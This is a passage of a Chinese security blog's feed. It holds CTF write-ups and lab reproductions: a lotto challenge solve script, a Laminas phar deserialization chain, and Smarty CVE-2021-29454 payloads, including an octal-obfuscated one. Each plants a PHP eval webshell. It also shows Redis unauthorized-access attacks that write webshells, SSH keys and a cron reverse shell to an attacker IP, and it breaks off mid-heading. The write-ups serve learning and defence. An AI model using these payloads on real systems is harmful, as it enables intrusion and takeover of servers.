class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    message = <span class="string">&#x27;Lotto Error!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;lotto.html&#x27;</span>, message=message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> safe_check(lotto_key):</span><br><span class="line">    os.environ[lotto_key] = lotto_value</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.system(<span class="string">&#x27;wget --content-disposition -N lotto&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&quot;/app/lotto_result.txt&quot;</span>):</span><br><span class="line">            lotto_result = <span class="built_in">open</span>(<span class="string">&quot;/app/lotto_result.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lotto_result = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">&quot;/app/guess/forecast.txt&quot;</span>):</span><br><span class="line">            forecast = <span class="built_in">open</span>(<span class="string">&quot;/app/guess/forecast.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            forecast = <span class="string">&#x27;forecast&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> forecast == lotto_result:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure><p>可以通过post的方式设置一个环境变量，会被用来执行<code>wget --content-disposition -N lotto</code>，把result.txt文件下载到<code>/app</code>路由下，然后判断forecast.txt和result.txt是否相等，是则返回flag</p><p>wget要遍历PATH找到命令所在的路径才能顺利执行，只要设置PATH为空，就可以令wget执行报错而绕过，使得result.txt不会更新</p><p>所以流程就是先访问一次<code>/lotto</code>和<code>/result</code>得到result，然后在<code>/forecast</code>把result上传作为forecast.txt的内容，最后再去<code>/lotto</code>路由修改PATH的值，就能得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://49.232.142.38:8880/&quot;</span></span><br><span class="line">requests.post(url=url+<span class="string">&#x27;lotto&#x27;</span>, data=&#123;<span class="string">&#x27;lotto_key&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;lotto_value&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">r = requests.get(url=url+<span class="string">&#x27;result&#x27;</span>).text.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;&lt;p&gt;&quot;</span>)[-<span class="number">1</span>].split(<span class="string">&quot;&lt;/p&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;res.txt&quot;</span>, <span class="string">&quot;w+&quot;</span>, newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.writelines(r)</span><br><span class="line">requests.post(url=url+<span class="string">&#x27;forecast&#x27;</span>, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;)</span><br><span class="line">r = requests.post(url=url+<span class="string">&#x27;lotto&#x27;</span>, data=&#123;<span class="string">&#x27;lotto_key&#x27;</span>: <span class="string">&quot;PATH&quot;</span>, <span class="string">&#x27;lotto_value&#x27;</span>: <span class="string">&quot;/&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># 因为文件中如果有\r\n,也会导致forecast和result不等,所以写文件用了newline=&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="oh-my-lotto-revenge"><a href="#oh-my-lotto-revenge" class="headerlink" title="oh-my-lotto-revenge"></a>oh-my-lotto-revenge</h1><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220430151928524.png" alt="image-20220430151928524"></p><p>相比于lotto，即使result和forecast相等也不能返回flag</p><p>可以利用WGETRC配合http_proxy和output_document，写入SSTI到templates目录，利用SSTI完成RCE</p><p>有些细节还没怎么搞明白，一直打不通，过几天再写详细过程</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;oh-my-grafana&quot;&gt;&lt;a href=&quot;#oh-my-grafana&quot; class=&quot;headerlink&quot; title=&quot;oh-my-grafana&quot;&gt;&lt;/a&gt;oh-my-grafana&lt;/h1&gt;&lt;p&gt;貌似官方的docker炸了，环境没搭起来&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>红明谷2022-两道Web复现</title>
    <link href="https://wuyusanhua2021.github.io/2022/04/15/%E7%BA%A2%E6%98%8E%E8%B0%B72022%E5%A4%8D%E7%8E%B0/"/>
    <id>https://wuyusanhua2021.github.io/2022/04/15/%E7%BA%A2%E6%98%8E%E8%B0%B72022%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-04-15T13:07:00.000Z</published>
    <updated>2022-04-18T05:53:12.039Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fan-Website"><a href="#Fan-Website" class="headerlink" title="Fan Website"></a>Fan Website</h1><p><code>www.zip</code>源码泄露，找到<code>/module/Album/src/Controller/AlbumController.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">imgdeleteAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;getRequest();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$request</span>-&gt;getPost()[<span class="string">&#x27;imgpath&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$imgpath</span> = <span class="variable">$request</span>-&gt;getPost()[<span class="string">&#x27;imgpath&#x27;</span>];</span><br><span class="line">        <span class="variable">$base</span> = substr(<span class="variable">$imgpath</span>,-<span class="number">4</span>,<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$base</span>,<span class="keyword">$this</span>-&gt;white_list))&#123;     <span class="comment">//白名单</span></span><br><span class="line">            @unlink(<span class="variable">$imgpath</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Only Img File Can Be Deleted!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">imguploadAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$form</span> = <span class="keyword">new</span> UploadForm(<span class="string">&#x27;upload-form&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$request</span> = <span class="keyword">$this</span>-&gt;getRequest();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$request</span>-&gt;isPost()) &#123;</span><br><span class="line">        <span class="comment">// Make certain to merge the $_FILES info!</span></span><br><span class="line">        <span class="variable">$post</span> = array_merge_recursive(</span><br><span class="line">            <span class="variable">$request</span>-&gt;getPost()-&gt;toArray(),</span><br><span class="line">            <span class="variable">$request</span>-&gt;getFiles()-&gt;toArray()</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="variable">$form</span>-&gt;setData(<span class="variable">$post</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$form</span>-&gt;isValid()) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$form</span>-&gt;getData();</span><br><span class="line">            <span class="variable">$base</span> = substr(<span class="variable">$data</span>[<span class="string">&quot;image-file&quot;</span>][<span class="string">&quot;name&quot;</span>],-<span class="number">4</span>,<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$base</span>,<span class="keyword">$this</span>-&gt;white_list))&#123;   <span class="comment">//白名单限制</span></span><br><span class="line">                <span class="variable">$cont</span> = file_get_contents(<span class="variable">$data</span>[<span class="string">&quot;image-file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&quot;/&lt;\?|php|HALT\_COMPILER/i&quot;</span>, <span class="variable">$cont</span> )) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;Not This&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$data</span>[<span class="string">&quot;image-file&quot;</span>][<span class="string">&quot;size&quot;</span>]&lt;<span class="number">3000</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;The picture size must be more than 3kb&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$img_path</span> = realpath(getcwd()).<span class="string">&#x27;/public/img/&#x27;</span>.md5(<span class="variable">$data</span>[<span class="string">&quot;image-file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="variable">$base</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$img_path</span>;</span><br><span class="line">                <span class="variable">$form</span>-&gt;saveImg(<span class="variable">$data</span>[<span class="string">&quot;image-file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$img_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Only Img Can Be Uploaded!&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Form is valid, save the form!</span></span><br><span class="line">            <span class="comment">//return $this-&gt;redirect()-&gt;toRoute(&#x27;upload-form/success&#x27;);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>审计代码，由<code>@unlink</code>以及<code>preg_match(&quot;/&lt;\?|php|HALT\_COMPILER/i&quot;, $cont )</code>可以确定是传phar文件反序列化，又由<code>README.md</code>知该网站使用了<code>Laminas</code>框架，百度反序列化链子，得exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Laminas\View\Resolver&#123;</span><br><span class="line">    class TemplateMapResolver&#123;</span><br><span class="line">        protected $map = [&quot;setBody&quot;=&gt;&quot;system&quot;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Laminas\View\Renderer&#123;</span><br><span class="line">    class PhpRenderer&#123;</span><br><span class="line">        private $__helpers;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;__helpers = new \Laminas\View\Resolver\TemplateMapResolver();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace Laminas\Log\Writer&#123;</span><br><span class="line">    abstract class AbstractWriter&#123;&#125;</span><br><span class="line"></span><br><span class="line">    class Mail extends AbstractWriter&#123;</span><br><span class="line">        protected $eventsToMail = [&#x27;echo &quot;&lt;?php eval(\$_POST[1]); ?&gt;&quot; &gt; /var/www/public/a.php&#x27;];</span><br><span class="line">        protected $subjectPrependText = null;</span><br><span class="line">        protected $mail;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;mail = new \Laminas\View\Renderer\PhpRenderer();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Laminas\Log&#123;</span><br><span class="line">    class Logger&#123;</span><br><span class="line">        protected $writers;</span><br><span class="line">        function __construct()&#123;</span><br><span class="line">            $this-&gt;writers = [new \Laminas\Log\Writer\Mail()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line">    $data = new \Laminas\Log\Logger();</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">    $phar-&gt;setMetadata($data);</span><br><span class="line">    $phar-&gt;addFromString(&quot;data&quot;, str_repeat(&#x27;123&#x27;,1000000));</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是绕过正则，可以使用<code>gzip</code>进行压缩，得到的gz文件没有被过滤的关键字，而且上传后依然可以触发反序列化</p><p>此外还有一个限制，上传的文件大小必须要大于等于3000，如果不合适，一直在后面补数据就行了</p><p>然后在<code>/album/imgupload</code>路由上传文件，上传成功后页面回显文件上传的路径，再转到<code>/album/imgdelete</code>路由用phar协议触发文件生成websell，蚁剑连接</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//img/image-20220417194324089.png" alt="image-20220417194324089"></p><h1 id="Smarty-Calcutor"><a href="#Smarty-Calcutor" class="headerlink" title="Smarty Calcutor"></a>Smarty Calcutor</h1><p><code>www.zip</code>源码泄露</p><p>Smarty.class.php</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img//imgimage-20220417201135482.png" alt="image-20220417201135482"></p><p>可以看到本题使用了3.1.39版本的smarty模板，其中函数插件math存在模板注入漏洞<a href="https://xz.aliyun.com/t/11108#toc-7">CVE-2021-29454</a></p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;./Smarty/Smarty.class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty();</span><br><span class="line"><span class="variable">$my_security_policy</span> = <span class="keyword">new</span> Smarty_Security(<span class="variable">$smarty</span>);</span><br><span class="line"><span class="variable">$my_security_policy</span>-&gt;php_functions = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$my_security_policy</span>-&gt;php_handling = Smarty::PHP_REMOVE;</span><br><span class="line"><span class="variable">$my_security_policy</span>-&gt;php_modifiers = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$my_security_policy</span>-&gt;static_classes = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$my_security_policy</span>-&gt;allow_super_globals = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$my_security_policy</span>-&gt;allow_constants = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$my_security_policy</span>-&gt;allow_php_tag = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$my_security_policy</span>-&gt;streams = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$my_security_policy</span>-&gt;php_modifiers = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;enableSecurity(<span class="variable">$my_security_policy</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$pattern</span> = <span class="string">&quot;php|\&lt;|flag|\?&quot;</span>;</span><br><span class="line">  <span class="variable">$vpattern</span> = explode(<span class="string">&quot;|&quot;</span>, <span class="variable">$pattern</span>);</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/<span class="subst">$value</span>/&quot;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;div style=&#x27;width:100%;text-align:center&#x27;&gt;&lt;h5&gt;Calculator don  not like U&lt;h5&gt;&lt;br&gt;&quot;</span>);</span><br><span class="line">          <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">      <span class="variable">$data</span> = waf(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;div style=&#x27;width:100%;text-align:center&#x27;&gt;&lt;h5&gt;Only smarty people can use calculators:&lt;h5&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&quot;</span> . <span class="variable">$data</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(\&quot;你还没有登录\&quot;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传data前先加一个cookie，键为login，值随意，还有一个waf过滤，由于该漏洞原理是不安全的调用了eval()函数，所以可以通过八进制或十六进制的方法绕过</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;math equation=<span class="string">&quot;(&quot;</span>file_put_contents<span class="string">&quot;)(&quot;</span><span class="number">1</span>.php<span class="string">&quot;,&quot;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span><span class="string">&quot;)&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;math equation=<span class="string">&quot;(\&quot;\\146\\151\\154\\145\\137\\160\\165\\164\\137\\143\\157\\156\\164\\145\\156\\164\\163\&quot;)(\&quot;\\61\\56\\160\\150\\160\&quot;,\&quot;\\74\\77\\160\\150\\160\\40\\145\\166\\141\\154(\\44\\137\\120\\117\\123\\124\\133\\61\\135)\\73\\77\\76\&quot;)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Fan-Website&quot;&gt;&lt;a href=&quot;#Fan-Website&quot; class=&quot;headerlink&quot; title=&quot;Fan Website&quot;&gt;&lt;/a&gt;Fan Website&lt;/h1&gt;&lt;p&gt;&lt;code&gt;www.zip&lt;/code&gt;源码泄露，找到&lt;code&gt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>一些Redis漏洞复现</title>
    <link href="https://wuyusanhua2021.github.io/2022/04/10/%E4%B8%80%E4%BA%9BRedis%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://wuyusanhua2021.github.io/2022/04/10/%E4%B8%80%E4%BA%9BRedis%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-04-10T02:52:32.000Z</published>
    <updated>2022-04-17T12:01:16.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前VNCTF的时候遇到过一道redis的题，这几天想起来了，复现时那题反弹shell也没成功，于是就复现了一些redis的漏洞，做了道例题，学习一下</p><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><p>redis版本：5.0.12</p><p>攻击机：kali</p><p>靶机：ubuntu18.04</p><h1 id="Redis未授权访问漏洞"><a href="#Redis未授权访问漏洞" class="headerlink" title="Redis未授权访问漏洞"></a>Redis未授权访问漏洞</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol><li>redis没有对连接ip进行限制，直接暴露在公网</li><li>redis没有设置登录密码</li></ol><h2 id="漏洞复现与实际应用"><a href="#漏洞复现与实际应用" class="headerlink" title="漏洞复现与实际应用"></a>漏洞复现与实际应用</h2><p>redil-cli直连就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h ip</span><br></pre></td></tr></table></figure><p>重点是连上后怎么用redis来进行攻击，先给出一些redis常用命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> xz <span class="string">&quot;Hacker&quot;</span>                     # 设置键xz的值为字符串Hacker</span><br><span class="line"><span class="builtin-name">get</span> xz                              # 获取键xz的内容</span><br><span class="line"><span class="builtin-name">SET</span> score 857                       # 设置键score的值为857</span><br><span class="line">INCR score                          # 使用INCR命令将score的值增加1</span><br><span class="line"><span class="builtin-name">GET</span> score                           # 获取键score的内容</span><br><span class="line">keys *                              # 列出当前数据库中所有的键<span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="builtin-name">set</span> protected-mode <span class="literal">no</span>        # 关闭安全模式</span><br><span class="line"><span class="builtin-name">get</span> anotherkey                      # 获取一个不存在的键的值<span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="builtin-name">set</span> dir /root/redis          # 设置保存目录<span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="builtin-name">set</span> dbfilename redis.rdb     # 设置保存文件名<span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="builtin-name">get</span> dir                      # 查看保存目录<span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="builtin-name">get</span> dbfilename               # 查看保存文件名</span><br><span class="line">save                                # 进行一次备份操作</span><br><span class="line">flushall                            # 删除所有数据</span><br><span class="line">del key                             # 删除键为key的数据</span><br><span class="line">slaveof<span class="built_in"> ip port </span>                    # 设置主从关系</span><br><span class="line">redis-cli -h<span class="built_in"> ip </span>-p 6379 -a passwd   # 外部连接</span><br></pre></td></tr></table></figure><p>用上面的<code>config set dir dirpath</code>命令修改redis的缓冲文件存储路径，再用<code>config set dbfilename  xxx</code>修改缓冲文件名， 最后用<code>save</code>就会把缓冲文件存到指定路径。</p><p>把payload写进缓冲里，再利用这个功能就可以执行各种攻击</p><h3 id="Redis写webshell"><a href="#Redis写webshell" class="headerlink" title="Redis写webshell"></a>Redis写webshell</h3><p>在攻击机上连接靶机的redis后，执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php @eval(<span class="variable">$_POST</span>[hack]);?&gt;\r\n\r\n&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>成功在指定目录下生成shell.php</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220407160455817.png" alt="image-20220407160455817"></p><h3 id="Redis写ssh公钥"><a href="#Redis写ssh公钥" class="headerlink" title="Redis写ssh公钥"></a>Redis写ssh公钥</h3><p>首先在攻击机上生成一个ssh公钥，然后把公钥写进reids的缓冲，之后以同样的原理，把缓冲文件的保存路径切换到<code>/root/.ssh</code>，文件名修改为<code>authorized_keys</code>即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ssh-kegen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat /root/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; /root/.ssh/key.txt</span><br><span class="line">cat /root/.ssh/key.txt | redis-cli -h ip -x <span class="built_in">set</span> xxx</span><br><span class="line"></span><br><span class="line">redis-cli -h ip</span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>此时已经可以用攻击机ssh直连靶机了</p><p><img src="https://cdn.jsdelivr.net/gh/wuyusanhua2021/hexo_img/img/image-20220407161524227.png" alt="image-20220407161524227"></p><h3 id="Redis写计划任务"><a href="#Redis写计划任务" class="headerlink" title="Redis写计划任务"></a>Redis写计划任务</h3><p>具体操作过程如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.80.7</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.80.3/2333 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/crontabs/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>这样直接攻击centos是能顺利弹回shell的，但是ubuntu却不行，一是ubuntu不会忽略root文件里面的乱码，二是ubuntu默认使用<code>/bin/dash</code>处理脚本，三是ubuntu要想弹shell还要把root文件权限改成600，手动清除乱码，修改设置后，才能弹回来，感觉实战中基本就不用考虑了</p><h1 id="Redis远程主从复制rce漏洞"><a href="#Redis远程主从复制rce漏洞" class="headerlink" title="Redis远程主从复制rce漏洞"></a>Redis远程主从复制rce漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" 